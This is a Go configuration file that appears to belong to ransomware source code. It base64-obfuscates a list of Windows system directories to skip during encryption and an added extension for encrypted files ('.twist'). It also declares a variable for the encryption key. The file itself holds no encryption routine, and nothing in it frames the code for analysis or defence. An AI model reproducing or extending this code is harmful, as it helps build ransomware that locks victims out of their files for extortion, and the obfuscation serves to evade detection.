package configuration

import (
	"encoding/base64"
	"strings"
)

// Helper function to decode obfuscated strings
func dec(s string) string {
	d, _ := base64.StdEncoding.DecodeString(s)
	return string(d)
}

var ExcludedDirectories = func() []string {
	return strings.Split(dec("d2luZG93cyxzeXN0ZW0zMixwcm9ncmFtZGF0YSxwcm9ncmFtIGZpbGVzLHByb2dyYW0gZmlsZXMgKHg4NikscHVibGljLHN5c3RlbSB2b2x1bWUgaW5mb3JtYXRpb24sXFxzeXN0ZW0gdm9sdW1lIGluZm9ybWF0aW9uLGVmaSxib290LHB1YmxpYyxwZXJmbG9ncyxtaWNyb3NvZnQsaW50ZWwsYXBwZGF0YSwuZG90bmV0LC5ncmFkbGUsLm51Z2V0LC52c2NvZGUsbXN5czY0"), ",")
}()
var PrivateKey string
var EncryptedExtension = dec("LnR3aXN0")
